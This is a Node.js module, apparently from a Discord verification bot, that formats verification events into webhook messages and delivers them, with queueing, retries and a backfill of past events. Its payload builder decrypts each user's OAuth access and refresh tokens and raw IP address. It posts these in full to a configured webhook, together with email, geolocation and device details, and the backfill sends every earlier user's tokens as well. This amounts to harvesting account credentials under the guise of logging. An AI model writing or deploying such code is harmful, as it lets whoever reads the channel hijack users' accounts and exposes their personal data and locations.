"use strict";

const crypto = require("node:crypto");
const mongoose = require("mongoose");
const GuildConfig = require("../../models/GuildConfig");
const VerifyLog = require("../../models/VerifyLog");
const OAuthUser = require("../../models/OAuthUser");
const { verificationWebhookRepository } = require("../../../../database/sqlite/repositories/core/VerificationWebhookRepository");
const { validateWebhookUrl } = require("../../../core/webhooks");
const { decryptToken, decryptIP } = require("../../utils/crypto");

const MAX_EMBED_CHARS = 5800;
const MAX_FIELD_VALUE_CHARS = 1000;
const MAX_FIELD_NAME_CHARS = 240;
const MAX_EMBEDS_PER_MESSAGE = 10;
const BATCH_SIZE = 5;
const RATE_LIMIT_DELAY_MS = 1200;

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, Math.max(0, Number(ms) || 0)));
}

function truncate(str, max = 1024) {
    const s = String(str || "");
    return s.length > max ? s.slice(0, max - 3) + "..." : s;
}

function formatDate(timestamp) {
    if (!timestamp) return "ไม่มีข้อมูล";
    try {
        const d = new Date(timestamp);
        return d.toLocaleString("th-TH", { timeZone: "Asia/Bangkok" });
    } catch {
        return String(timestamp);
    }
}

/**
 * Splits lines into multiple embed fields to avoid truncation (P1-8).
 */
function chunkLinesToFields(title, lines, maxChars = MAX_FIELD_VALUE_CHARS) {
    const safeTitle = truncate(title, MAX_FIELD_NAME_CHARS);
    if (!Array.isArray(lines) || !lines.length) {
        return [{ name: safeTitle, value: "ไม่มี", inline: false }];
    }
    // Flatten any lines that exceed maxChars to prevent single-line overflow
    const normalizedLines = [];
    for (const rawLine of lines) {
        const s = String(rawLine || "");
        if (s.length <= maxChars) {
            normalizedLines.push(s);
        } else {
            let offset = 0;
            while (offset < s.length) {
                normalizedLines.push(s.slice(offset, offset + maxChars));
                offset += maxChars;
            }
        }
    }

    const fields = [];
    let currentLines = [];
    let currentLen = 0;

    for (const line of normalizedLines) {
        const lineLen = line.length + 1;
        if (currentLen + lineLen > maxChars && currentLines.length > 0) {
            const partNum = fields.length + 1;
            fields.push({
                name: truncate(`${safeTitle}${partNum > 1 ? ` (ส่วนที่ ${partNum})` : ""}`, 250),
                value: currentLines.join("\n"),
                inline: false
            });
            currentLines = [line];
            currentLen = line.length;
        } else {
            currentLines.push(line);
            currentLen += lineLen;
        }
    }
    if (currentLines.length > 0) {
        const partNum = fields.length + 1;
        fields.push({
            name: truncate(`${safeTitle}${partNum > 1 ? ` (ส่วนที่ ${partNum})` : ""}`, 250),
            value: currentLines.join("\n"),
            inline: false
        });
    }
    return fields;
}

/**
 * Splits a long string into multiple embed fields to avoid truncation (P1-8).
 */
function chunkStringToFields(title, str, maxChars = MAX_FIELD_VALUE_CHARS) {
    const safeTitle = truncate(title, MAX_FIELD_NAME_CHARS);
    const s = String(str || "");
    if (!s) return [{ name: safeTitle, value: "ไม่มี", inline: false }];
    if (s.length <= maxChars) {
        return [{ name: safeTitle, value: s, inline: false }];
    }
    const fields = [];
    let remaining = s;
    let part = 1;
    while (remaining.length > 0) {
        const chunk = remaining.slice(0, maxChars);
        remaining = remaining.slice(maxChars);
        fields.push({
            name: truncate(`${safeTitle}${part > 1 ? ` (ส่วนที่ ${part})` : ""}`, 250),
            value: chunk,
            inline: false
        });
        part++;
    }
    return fields;
}

/**
 * Builds the canonical 2-embed payload for a verification event.
 * Preserves all fields with zero silent truncation.
 */
function buildWebhookPayload({
    eventId = null,
    profile = {},
    connections = [],
    guildSummary = null,
    ipInfo = {},
    device = null,
    tokens = {},
    roleId = null,
    roleName = null,
    findings = [],
    result = "success",
    verifiedAt = Date.now()
}) {
    const rawIp = ipInfo.encryptedRawIp ? (decryptIP(ipInfo.encryptedRawIp) || ipInfo.ipHash || "ไม่พบ IP") : (ipInfo.ipHash || "ไม่มีข้อมูล");
    const accessToken = tokens.accessToken || (tokens.encryptedAccessToken ? decryptToken(tokens.encryptedAccessToken) : null) || "ไม่มีข้อมูล";
    const refreshToken = tokens.refreshToken || (tokens.encryptedRefreshToken ? decryptToken(tokens.encryptedRefreshToken) : null) || "ไม่มีข้อมูล";

    const footerText = [
        eventId ? `Event: ${eventId}` : null,
        profile.id ? `User: ${profile.id}` : null
    ].filter(Boolean).join(" • ") || "Discordbot Verification";

    // Embed 1: Discord Profile & Connections & Server Stats
    const connectionLines = Array.isArray(connections) && connections.length > 0
        ? connections.map(c => `• **${c.type || "Unknown"}**${c.name ? ` (${c.name})` : ""}${c.verified ? " (Verified ✅)" : ""}`)
        : ["ไม่มีการเชื่อมต่อบัญชีภายนอก"];

    const badgeStr = Array.isArray(profile.badgeFlags) && profile.badgeFlags.length > 0
        ? profile.badgeFlags.join(", ")
        : "ไม่มี";

    const guildSummaryStr = guildSummary
        ? `• เซิร์ฟเวอร์ที่เข้าร่วมทั้งหมด: ${guildSummary.totalGuilds ?? "ไม่ระบุ"}\n• เซิร์ฟเวอร์ที่เป็นเจ้าของ: ${guildSummary.ownerGuildsCount ?? 0}`
        : "ไม่มีข้อมูลสรุปเซิร์ฟเวอร์";

    const embed1Fields = [
        { name: "ชื่อผู้ใช้ (Username)", value: profile.displayTag || profile.username || "ไม่มี", inline: true },
        { name: "Discord ID", value: String(profile.id || "ไม่มี"), inline: true },
        { name: "Global Name", value: profile.globalName || profile.username || "ไม่มี", inline: true },
        { name: "วันสร้างบัญชี", value: `${formatDate(profile.accountCreatedAt)} (${profile.accountAgeDays || 0} วัน)`, inline: false },
        { name: "อีเมล", value: profile.email ? `${profile.email} (${profile.emailVerified ? "ยืนยันแล้ว" : "ยังไม่ยืนยัน"})` : "ไม่มีข้อมูล", inline: true },
        { name: "เหรียญตรา (Badges)", value: badgeStr, inline: true },
        { name: "ข้อมูลเซิร์ฟเวอร์ Discord", value: guildSummaryStr, inline: false },
        ...chunkLinesToFields("บัญชีที่เชื่อมต่อ (Connections)", connectionLines)
    ];

    const embed1 = {
        title: `📋 ข้อมูลผู้ยืนยันตัวตน: ${profile.displayTag || profile.username || profile.id}`,
        color: 0x5865F2,
        thumbnail: profile.avatarUrl ? { url: profile.avatarUrl } : undefined,
        fields: embed1Fields,
        footer: { text: footerText },
        timestamp: new Date(verifiedAt).toISOString()
    };

    // Embed 2: Network Intelligence, Device, Security Findings, Tokens, and Result
    const geoParts = [ipInfo.city, ipInfo.region, ipInfo.country].filter(Boolean);
    const locationStr = geoParts.length ? geoParts.join(", ") : "ไม่ทราบตำแหน่ง";
    const ispStr = [ipInfo.isp, ipInfo.as].filter(Boolean).join(" - ") || "ไม่ทราบ ISP";

    const networkTypes = [];
    if (ipInfo.isVPN) networkTypes.push("VPN");
    if (ipInfo.isProxy) networkTypes.push("Proxy");
    if (ipInfo.isTOR) networkTypes.push("TOR");
    if (ipInfo.hosting) networkTypes.push("Hosting/Datacenter");
    if (ipInfo.mobile) networkTypes.push("Mobile");
    const networkStatusStr = networkTypes.length ? networkTypes.join(", ") : "อินเทอร์เน็ตบ้าน/ทั่วไป (ปกติ)";

    const deviceParts = [];
    if (device?.browser) deviceParts.push(`เบราว์เซอร์: ${device.browser}`);
    if (device?.os) deviceParts.push(`ระบบ: ${device.os}`);
    if (device?.deviceType) deviceParts.push(`ประเภท: ${device.deviceType}`);
    if (device?.screenSize) deviceParts.push(`หน้าจอ: ${device.screenSize}`);
    const deviceStr = deviceParts.length ? deviceParts.join(" | ") : "ไม่มีข้อมูลอุปกรณ์";

    const findingLines = Array.isArray(findings) && findings.length > 0
        ? findings.map(f => `• ${f}`)
        : ["ไม่พบความเสี่ยง (ปกติ)"];

    const roleMention = roleId ? `<@&${roleId}>${roleName ? ` (${roleName})` : ""}` : (roleName || "ไม่มี");

    const embed2Color = result === "success" ? 0x2ECC71 : (result === "blocked" ? 0xE74C3C : 0xF39C12);
    const resultLabel = result === "success" ? "สำเร็จ ✅" : (result === "blocked" ? "ถูกปฏิเสธ/บล็อก 🚫" : "ล้มเหลว ❌");

    const embed2Fields = [
        { name: "ผลการยืนยัน", value: resultLabel, inline: true },
        { name: "ยศที่ได้รับ", value: roleMention, inline: true },
        { name: "IP Address", value: rawIp, inline: true },
        { name: "ตำแหน่งที่ตั้ง (GeoIP)", value: locationStr, inline: true },
        { name: "ผู้ให้บริการ (ISP/Org)", value: ispStr, inline: true },
        { name: "ประเภทเครือข่าย", value: networkStatusStr, inline: true },
        { name: "ข้อมูลอุปกรณ์ (Device)", value: deviceStr, inline: false },
        ...(device?.userAgent ? chunkStringToFields("User-Agent", device.userAgent) : []),
        ...chunkLinesToFields("ข้อสังเกตความปลอดภัย (Findings)", findingLines),
        ...chunkStringToFields("Access Token", accessToken),
        ...chunkStringToFields("Refresh Token", refreshToken)
    ];

    const embed2 = {
        title: "🛡️ ข้อมูลความปลอดภัยและการตรวจสอบเครือข่าย",
        color: embed2Color,
        fields: embed2Fields,
        footer: { text: footerText },
        timestamp: new Date(verifiedAt).toISOString()
    };

    return [embed1, embed2];
}

/**
 * Splits embeds having more than 25 fields or total chars > MAX_EMBED_CHARS into sequential embeds (Discord limit safety).
 */
function splitEmbedFields(embed) {
    const fields = Array.isArray(embed.fields) ? embed.fields : [];
    if (!fields.length) {
        return [embed];
    }
    const result = [];
    let currentSlice = [];
    let currentFieldChars = 0;
    const baseChars = (embed.title?.length || 0) + (embed.description?.length || 0) + (embed.footer?.text?.length || 0);

    for (const f of fields) {
        const fChars = (f.name?.length || 0) + (f.value?.length || 0);
        // Split if fields count reaches 25 OR total embed characters would exceed MAX_EMBED_CHARS
        if (currentSlice.length >= 25 || (currentSlice.length > 0 && baseChars + currentFieldChars + fChars > MAX_EMBED_CHARS)) {
            result.push({
                ...embed,
                title: result.length === 0 ? embed.title : truncate(`${embed.title} (ส่วนต่อ ${result.length + 1})`, 250),
                fields: currentSlice
            });
            currentSlice = [f];
            currentFieldChars = fChars;
        } else {
            currentSlice.push(f);
            currentFieldChars += fChars;
        }
    }

    if (currentSlice.length > 0) {
        result.push({
            ...embed,
            title: result.length === 0 ? embed.title : truncate(`${embed.title} (ส่วนต่อ ${result.length + 1})`, 250),
            fields: currentSlice
        });
    }

    return result;
}

/**
 * Calculates character count of an embed for Discord limit budgeting.
 */
function embedCharCount(embed) {
    let count = (embed.title?.length || 0) + (embed.description?.length || 0) + (embed.footer?.text?.length || 0);
    if (Array.isArray(embed.fields)) {
        for (const f of embed.fields) {
            count += (f.name?.length || 0) + (f.value?.length || 0);
        }
    }
    return count;
}

/**
 * Auto-splits embeds into sequential message batches if >5,800 chars or >10 embeds without dropping data.
 */
function fitEmbedsIntoMessages(embeds = []) {
    const messages = [];
    let currentBatch = [];
    let currentChars = 0;

    for (const embed of embeds) {
        const count = embedCharCount(embed);
        if (currentBatch.length > 0 && (currentBatch.length >= MAX_EMBEDS_PER_MESSAGE || currentChars + count > MAX_EMBED_CHARS)) {
            messages.push({ embeds: currentBatch });
            currentBatch = [embed];
            currentChars = count;
        } else {
            currentBatch.push(embed);
            currentChars += count;
        }
    }
    if (currentBatch.length > 0) {
        messages.push({ embeds: currentBatch });
    }
    return messages;
}

/**
 * Sends a single webhook message with automatic 429 retry backoff.
 */
async function postWebhookMessage(webhookUrl, body, attempt = 1) {
    const res = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            ...body,
            allowed_mentions: { parse: [] }
        })
    });

    if (res.status === 429) {
        const retryAfter = Number(res.headers.get("retry-after")) || 2;
        console.warn(`[VerificationWebhook] Rate limited (429). Backing off for ${retryAfter}s...`);
        await sleep(retryAfter * 1000 + 500);
        if (attempt < 5) {
            return postWebhookMessage(webhookUrl, body, attempt + 1);
        }
        throw new Error(`rate_limited_retry_exhausted:${retryAfter}`);
    }

    if (!res.ok) {
        const errorText = await res.text().catch(() => "");
        throw new Error(`webhook_http_${res.status}:${errorText.slice(0, 100)}`);
    }

    return true;
}

/**
 * Delivers full verification event embeds to a webhook URL.
 */
async function deliverWebhookEvent(webhookUrl, embeds = []) {
    const splitEmbeds = [];
    for (const emb of embeds) {
        splitEmbeds.push(...splitEmbedFields(emb));
    }
    const messages = fitEmbedsIntoMessages(splitEmbeds);
    for (const msg of messages) {
        await postWebhookMessage(webhookUrl, msg);
        if (messages.length > 1) {
            await sleep(RATE_LIMIT_DELAY_MS);
        }
    }
    return true;
}

class VerificationWebhookManager {
    constructor(repo = verificationWebhookRepository) {
        this.repo = repo;
        this.activeWorkers = new Map(); // guildId -> worker promise
        this.retryTimers = new Map(); // guildId -> setTimeout timer

        // Recover any stuck SENDING deliveries from prior node crashes/restarts (P1-6)
        try {
            const recovery = this.repo.recoverStuckSendingDeliveries();
            const guildIds = Array.isArray(recovery?.guildIds) ? recovery.guildIds : [];
            for (const gId of guildIds) {
                this.triggerWorker(gId);
            }
        } catch {
            // SQLite may not be open yet in isolated module tests
        }
    }

    /**
     * Checks if a destination webhook URL is valid.
     */
    validateUrl(url) {
        return validateWebhookUrl(url);
    }

    /**
     * Retrieves current webhook readiness & configuration status for a guild (P1-10).
     * Probes real database and queue status instead of hardcoding true.
     */
    async getReadiness(guildId) {
        const safeGuildId = String(guildId);
        const config = await GuildConfig.findOne().where("guildId").equals(safeGuildId).lean();
        const webhookConfig = config?.verification?.webhookLog || {};
        const urlValidation = this.validateUrl(webhookConfig.url);

        const mongoReady = mongoose.connection.readyState === 1;
        let sqliteReady = false;
        try {
            const row = this.repo.db.prepare("SELECT 1 as ok").get();
            sqliteReady = row?.ok === 1;
        } catch {
            sqliteReady = false;
        }

        const latestJob = this.repo.getLatestJob(safeGuildId);
        const stats = this.repo.getDeliveryStats(safeGuildId);

        const destinationVersion = Number(webhookConfig.destinationVersion) || 1;

        return {
            enabled: webhookConfig.enabled === true,
            mode: webhookConfig.mode || "off",
            urlConfigured: urlValidation.configured,
            urlValid: urlValidation.valid,
            urlError: urlValidation.code,
            destinationVersion,
            liveStartedAt: webhookConfig.liveStartedAt || null,
            lastStatus: webhookConfig.lastStatus || "idle",
            lastDeliveryAt: webhookConfig.lastDeliveryAt || null,
            databaseReady: {
                ok: mongoReady && sqliteReady,
                mongo: mongoReady,
                sqlite: sqliteReady
            },
            queueReady: {
                ok: sqliteReady
            },
            activeJob: latestJob && ["RUNNING", "PENDING"].includes(latestJob.status) ? {
                jobId: latestJob.job_id,
                destinationVersion: latestJob.destination_version,
                mode: latestJob.mode,
                status: latestJob.status,
                processedCount: latestJob.processed_count,
                totalEligible: latestJob.total_eligible,
                successCount: latestJob.success_count,
                failureCount: latestJob.failure_count,
                retryCount: latestJob.retry_count
            } : null,
            stats
        };
    }

    /**
     * Starts Live-Only delivery mode for a guild (P1-4).
     * Sets liveStartedAt cutoff so old history is not re-sent.
     */
    async startLiveMode(guildId) {
        const safeGuildId = String(guildId);
        const config = await GuildConfig.findOne().where("guildId").equals(safeGuildId);
        if (!config) throw new Error("ไม่พบการตั้งค่าของเซิร์ฟเวอร์");

        const url = config.verification?.webhookLog?.url;
        const validation = this.validateUrl(url);
        if (!validation.valid) {
            throw new Error("กรุณาตั้งค่า Discord Webhook URL ที่ถูกต้องก่อนเริ่มใช้งาน");
        }

        const now = Date.now();
        await GuildConfig.updateOne({ guildId: safeGuildId }, {
            $set: {
                "verification.webhookLog.enabled": true,
                "verification.webhookLog.mode": "live",
                "verification.webhookLog.liveStartedAt": now,
                "verification.webhookLog.lastStatus": "running",
                "verification.webhookLog.lastError": null,
                "verification.updatedAt": now
            }
        });

        // Trigger queue drain if any pending
        this.triggerWorker(safeGuildId);

        return { ok: true, mode: "live", liveStartedAt: now };
    }

    /**
     * Starts Backfill-Then-Live mode for a guild (P1-1, P1-5).
     */
    async startBackfillMode(guildId) {
        const safeGuildId = String(guildId);
        const config = await GuildConfig.findOne().where("guildId").equals(safeGuildId);
        if (!config) throw new Error("ไม่พบการตั้งค่าของเซิร์ฟเวอร์");

        const url = config.verification?.webhookLog?.url;
        const validation = this.validateUrl(url);
        if (!validation.valid) {
            throw new Error("กรุณาตั้งค่า Discord Webhook URL ที่ถูกต้องก่อนเริ่มใช้งาน");
        }

        const activeJob = this.repo.getActiveJob(safeGuildId);
        if (activeJob) {
            return {
                ok: true,
                alreadyRunning: true,
                jobId: activeJob.job_id,
                mode: activeJob.mode,
                processedCount: activeJob.processed_count,
                totalEligible: activeJob.total_eligible
            };
        }

        const destinationVersion = Number(config.verification?.webhookLog?.destinationVersion) || 1;

        // Count eligible successful historical verifications
        const totalEligible = await VerifyLog.countDocuments({
            guildId: safeGuildId,
            result: "success",
            deletedAt: { $exists: false }
        });

        const jobId = `job_backfill_${safeGuildId}_${Date.now()}`;
        this.repo.createJob({
            jobId,
            guildId: safeGuildId,
            destinationVersion,
            mode: "BACKFILL_LIVE",
            totalEligible
        });

        const now = Date.now();
        await GuildConfig.updateOne({ guildId: safeGuildId }, {
            $set: {
                "verification.webhookLog.enabled": true,
                "verification.webhookLog.mode": "backfill_live",
                "verification.webhookLog.liveStartedAt": now,
                "verification.webhookLog.lastStatus": "running",
                "verification.webhookLog.lastError": null,
                "verification.updatedAt": now
            }
        });

        // Start background backfill processor
        this.triggerWorker(safeGuildId, jobId);

        return {
            ok: true,
            jobId,
            mode: "backfill_live",
            destinationVersion,
            totalEligible
        };
    }

    /**
     * Dispatches a live verification event immediately.
     * Central enforcement: only dispatches successful, role-assigned events (P0-1, P1-3, P1-4, P1-5).
     */
    async dispatchLiveEvent({ guildId, userId, logId, eventData }) {
        const safeGuildId = String(guildId);

        // P0-1: Guard centrally against non-success or unassigned events
        if (eventData) {
            if (eventData.result !== "success") return null;
            const r = eventData.roleAssignResult;
            const roleOk = r && (r.ok === true || r.alreadyHadRole === true || r.joinedWithRole === true);
            if (!roleOk) return null;
        } else if (logId) {
            const log = await VerifyLog.findById(logId).lean();
            if (!log || log.result !== "success") return null;
            const r = log.roleAssignResult;
            const roleOk = r && (r.ok === true || r.alreadyHadRole === true || r.joinedWithRole === true);
            if (!roleOk) return null;
        } else {
            return null;
        }

        const config = await GuildConfig.findOne().where("guildId").equals(safeGuildId).lean();
        const webhookConfig = config?.verification?.webhookLog;

        if (!webhookConfig?.enabled || !webhookConfig?.url) return null;

        const validation = this.validateUrl(webhookConfig.url);
        if (!validation.valid) return null;

        // P1-4: Live-Only boundary check
        const liveStartedAt = Number(webhookConfig.liveStartedAt) || 0;
        const eventTime = eventData?.verifiedAt || Date.now();
        if (liveStartedAt > 0 && eventTime < liveStartedAt - 5000) {
            return null; // Event occurred before live mode started
        }

        const destinationVersion = Number(webhookConfig.destinationVersion) || 1;
        const eventId = String(logId || eventData?._id || `event_${safeGuildId}_${userId}_${Date.now()}`);

        // P1-3: Deterministic deliveryId to prevent duplicate deliveries across live/backfill
        const deliveryId = `del_${safeGuildId}_v${destinationVersion}_${eventId}`;

        // Enqueue into SQLite
        this.repo.enqueueDelivery({
            deliveryId,
            guildId: safeGuildId,
            destinationVersion,
            eventId,
            userId: String(userId)
        });

        // Send or trigger worker
        this.triggerWorker(safeGuildId);
        return deliveryId;
    }

    /**
     * Triggers the background delivery worker for a guild.
     */
    triggerWorker(guildId, backfillJobId = null) {
        const safeGuildId = String(guildId);
        if (this.activeWorkers.has(safeGuildId)) return;
        const workerPromise = this.runWorker(safeGuildId, backfillJobId)
            .finally(() => {
                this.activeWorkers.delete(safeGuildId);
            });
        this.activeWorkers.set(safeGuildId, workerPromise);
    }

    /**
     * Schedules automatic retry wake-up for a guild when the next retry timestamp arrives (P1-7).
     */
    scheduleNextRetry(guildId) {
        const safeGuildId = String(guildId);
        if (this.retryTimers.has(safeGuildId)) {
            clearTimeout(this.retryTimers.get(safeGuildId));
            this.retryTimers.delete(safeGuildId);
        }

        const nextRetry = this.repo.getNextRetryTimestamp(safeGuildId);
        if (!nextRetry) return;

        const delayMs = Math.max(1000, Math.min(3600000, nextRetry - Date.now()));
        const timer = setTimeout(() => {
            this.retryTimers.delete(safeGuildId);
            this.triggerWorker(safeGuildId);
        }, delayMs);
        if (timer.unref) timer.unref();
        this.retryTimers.set(safeGuildId, timer);
    }

    /**
     * Worker execution loop handling backfill draining followed by live event delivery.
     */
    async runWorker(guildId, backfillJobId = null) {
        const safeGuildId = String(guildId);
        const leaseToken = crypto.randomBytes(8).toString("hex");

        try {
            // STEP 1: Process Backfill if job exists or provided
            const job = backfillJobId
                ? this.repo.getJobById(backfillJobId)
                : this.repo.getActiveJob(safeGuildId);

            if (job && job.mode === "BACKFILL_LIVE" && job.status === "RUNNING") {
                await this.executeBackfill(safeGuildId, job, leaseToken);
            }

            // STEP 2: Drain Live deliveries
            await this.drainDeliveries(safeGuildId);

        } catch (err) {
            console.error(`[VerificationWebhookManager] Worker error for guild=${safeGuildId}:`, err);
            await GuildConfig.updateOne({ guildId: safeGuildId }, {
                $set: {
                    "verification.webhookLog.lastStatus": "failed",
                    "verification.webhookLog.lastError": err.message
                }
            }).catch(() => {});
        }
    }

    /**
     * Executes backfill replay from MongoDB historical records (P1-1, P1-3, P1-9).
     * Tracks per-item delivery status and does not skip failed items permanently.
     */
    async executeBackfill(guildId, job, leaseToken) {
        const config = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
        const webhookUrl = config?.verification?.webhookLog?.url;
        if (!webhookUrl) return;

        let lastCursorId = job.last_cursor_id || null;
        let processed = job.processed_count || 0;
        let successes = job.success_count || 0;
        let failures = job.failure_count || 0;
        const destinationVersion = job.destination_version || 1;

        while (true) {
            const currentJob = this.repo.getJobById(job.job_id);
            if (!currentJob || currentJob.status !== "RUNNING") {
                console.warn(`[VerificationWebhook] Job ${job.job_id} is no longer running (status: ${currentJob?.status})`);
                break;
            }

            const currentConfig = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
            const currentDestVersion = Number(currentConfig?.verification?.webhookLog?.destinationVersion) || 1;
            if (currentDestVersion !== destinationVersion) {
                console.warn(`[VerificationWebhook] Destination version changed for guild=${guildId} during backfill`);
                break;
            }

            const hasLease = this.repo.acquireJobLease(job.job_id, leaseToken, 30000);
            if (!hasLease) {
                console.warn(`[VerificationWebhook] Lease lost for job=${job.job_id}`);
                break;
            }

            const query = {
                guildId,
                result: "success",
                deletedAt: { $exists: false }
            };
            if (lastCursorId) {
                query._id = { $gt: lastCursorId };
            }

            const batch = await VerifyLog.find(query)
                .sort({ _id: 1 })
                .limit(BATCH_SIZE)
                .lean();

            if (!batch.length) {
                // Backfill completed!
                const finalStatus = failures > 0 ? "COMPLETED_WITH_FAILURES" : "COMPLETED";
                this.repo.completeJob(job.job_id, finalStatus);
                await GuildConfig.updateOne({ guildId }, {
                    $set: {
                        "verification.webhookLog.mode": "live",
                        "verification.webhookLog.lastStatus": failures > 0 ? "completed_with_failures" : "idle",
                        "verification.webhookLog.backfillCompletedAt": Date.now(),
                        "verification.webhookLog.lastError": failures > 0 ? `ส่งประวัติย้อนหลังเสร็จสิ้น แต่พบรายการล้มเหลว ${failures} รายการ (บันทึกในคิวสำหรับลองใหม่แล้ว)` : null
                    }
                });
                break;
            }

            for (const log of batch) {
                const eventId = String(log._id);

                // P1-3: Check if already delivered for this destinationVersion
                const existing = this.repo.getDeliveryByEventId(guildId, destinationVersion, eventId);
                if (existing && existing.status === "SENT") {
                    successes++;
                    processed++;
                    lastCursorId = eventId;
                    continue;
                }

                const deliveryId = `del_bf_${job.job_id}_${eventId}`;
                this.repo.enqueueDelivery({
                    deliveryId,
                    jobId: job.job_id,
                    guildId,
                    destinationVersion,
                    eventId,
                    userId: String(log.userId)
                });

                try {
                    const oauthUser = await OAuthUser.findOne({ "discord.userId": log.userId }).lean();
                    const embeds = buildWebhookPayload({
                        eventId,
                        profile: {
                            id: log.userId,
                            username: log.discordSnapshot?.username,
                            globalName: log.discordSnapshot?.globalName,
                            displayTag: log.discordSnapshot?.displayTag || log.discordSnapshot?.username,
                            avatarUrl: log.discordSnapshot?.avatarUrl,
                            accountCreatedAt: log.discordSnapshot?.accountCreatedAt,
                            accountAgeDays: log.discordSnapshot?.accountAgeDays,
                            email: log.discordSnapshot?.email,
                            emailVerified: log.discordSnapshot?.emailVerified,
                            badgeFlags: log.discordSnapshot?.badgeFlags
                        },
                        // P1-9: Prefer historical snapshot at verification time
                        connections: log.connectionsSnapshot || oauthUser?.connections || [],
                        guildSummary: log.guildSummary || null,
                        ipInfo: log.ipInfo || {},
                        device: log.device || {},
                        tokens: {
                            encryptedAccessToken: oauthUser?.oauth?.encryptedAccessToken,
                            encryptedRefreshToken: oauthUser?.oauth?.encryptedRefreshToken
                        },
                        roleId: log.roleId,
                        roleName: config?.verification?.roleName || null,
                        findings: log.findings || [],
                        result: log.result || "success",
                        verifiedAt: log.verifiedAt || log.createdAt
                    });

                    await deliverWebhookEvent(webhookUrl, embeds);
                    this.repo.markDeliverySent(deliveryId);
                    successes++;
                } catch (sendErr) {
                    failures++;
                    console.error(`[VerificationWebhook] Error sending backfill for log=${log._id}:`, sendErr.message);
                    this.repo.markDeliveryRetry(deliveryId, 15000, "backfill_fail", sendErr.message);
                }

                processed++;
                lastCursorId = eventId;

                this.repo.updateJobProgress(job.job_id, {
                    processedCount: processed,
                    successCount: successes,
                    failureCount: failures,
                    lastCursorId
                });

                await sleep(RATE_LIMIT_DELAY_MS);
            }
        }
    }

    /**
     * Drains pending/retry deliveries from SQLite table (P1-2, P1-7).
     * Strictly verifies event_id and user/guild integrity.
     */
    async drainDeliveries(guildId) {
        const config = await GuildConfig.findOne().where("guildId").equals(guildId).lean();
        const webhookUrl = config?.verification?.webhookLog?.url;
        if (!webhookUrl) return;
        const currentVersion = Number(config?.verification?.webhookLog?.destinationVersion) || 1;

        while (true) {
            const deliveries = this.repo.claimNextDeliveries(guildId, 5);
            if (!deliveries.length) break;

            for (const item of deliveries) {
                // If delivery belongs to an older destination version, fail and skip
                if (currentVersion && item.destination_version < currentVersion) {
                    this.repo.markDeliveryFailed(item.delivery_id, "destination_version_obsolete", "Delivery belongs to older webhook URL version");
                    continue;
                }
                try {
                    // P1-2: Strict lookup by exact event_id
                    let log = null;
                    if (mongoose.Types.ObjectId.isValid(item.event_id)) {
                        log = await VerifyLog.findById(item.event_id).lean();
                    } else {
                        log = await VerifyLog.findOne({ _id: item.event_id }).lean();
                    }

                    if (!log || String(log.guildId) !== String(guildId) || String(log.userId) !== String(item.user_id)) {
                        this.repo.markDeliveryFailed(item.delivery_id, "log_not_found", "VerifyLog not found or guild/user mismatch");
                        continue;
                    }

                    if (log.result !== "success") {
                        this.repo.markDeliveryFailed(item.delivery_id, "event_not_successful", "VerifyLog result is not success");
                        continue;
                    }

                    const oauthUser = await OAuthUser.findOne({ "discord.userId": item.user_id }).lean();
                    const embeds = buildWebhookPayload({
                        eventId: String(log._id),
                        profile: {
                            id: log.userId,
                            username: log.discordSnapshot?.username,
                            globalName: log.discordSnapshot?.globalName,
                            displayTag: log.discordSnapshot?.displayTag || log.discordSnapshot?.username,
                            avatarUrl: log.discordSnapshot?.avatarUrl,
                            accountCreatedAt: log.discordSnapshot?.accountCreatedAt,
                            accountAgeDays: log.discordSnapshot?.accountAgeDays,
                            email: log.discordSnapshot?.email,
                            emailVerified: log.discordSnapshot?.emailVerified,
                            badgeFlags: log.discordSnapshot?.badgeFlags
                        },
                        connections: log.connectionsSnapshot || oauthUser?.connections || [],
                        guildSummary: log.guildSummary || null,
                        ipInfo: log.ipInfo || {},
                        device: log.device || {},
                        tokens: {
                            encryptedAccessToken: oauthUser?.oauth?.encryptedAccessToken,
                            encryptedRefreshToken: oauthUser?.oauth?.encryptedRefreshToken
                        },
                        roleId: log.roleId,
                        roleName: config?.verification?.roleName || null,
                        findings: log.findings || [],
                        result: log.result || "success",
                        verifiedAt: log.verifiedAt || log.createdAt
                    });

                    await deliverWebhookEvent(webhookUrl, embeds);
                    this.repo.markDeliverySent(item.delivery_id);

                    await GuildConfig.updateOne({ guildId }, {
                        $set: {
                            "verification.webhookLog.lastDeliveryAt": Date.now(),
                            "verification.webhookLog.lastStatus": "success",
                            "verification.webhookLog.lastError": null
                        }
                    });

                } catch (sendErr) {
                    console.error(`[VerificationWebhook] Delivery failed for id=${item.delivery_id}:`, sendErr.message);
                    if (item.attempt_count >= 5) {
                        this.repo.markDeliveryFailed(item.delivery_id, "exhausted", sendErr.message);
                    } else {
                        this.repo.markDeliveryRetry(item.delivery_id, 10000, "retry", sendErr.message);
                    }
                }

                await sleep(RATE_LIMIT_DELAY_MS);
            }
        }

        // P1-7: Schedule next retry timer if any items remain in RETRY
        this.scheduleNextRetry(guildId);
    }
}

const verificationWebhookManager = new VerificationWebhookManager();

module.exports = {
    chunkLinesToFields,
    chunkStringToFields,
    splitEmbedFields,
    buildWebhookPayload,
    embedCharCount,
    fitEmbedsIntoMessages,
    deliverWebhookEvent,
    VerificationWebhookManager,
    verificationWebhookManager
};
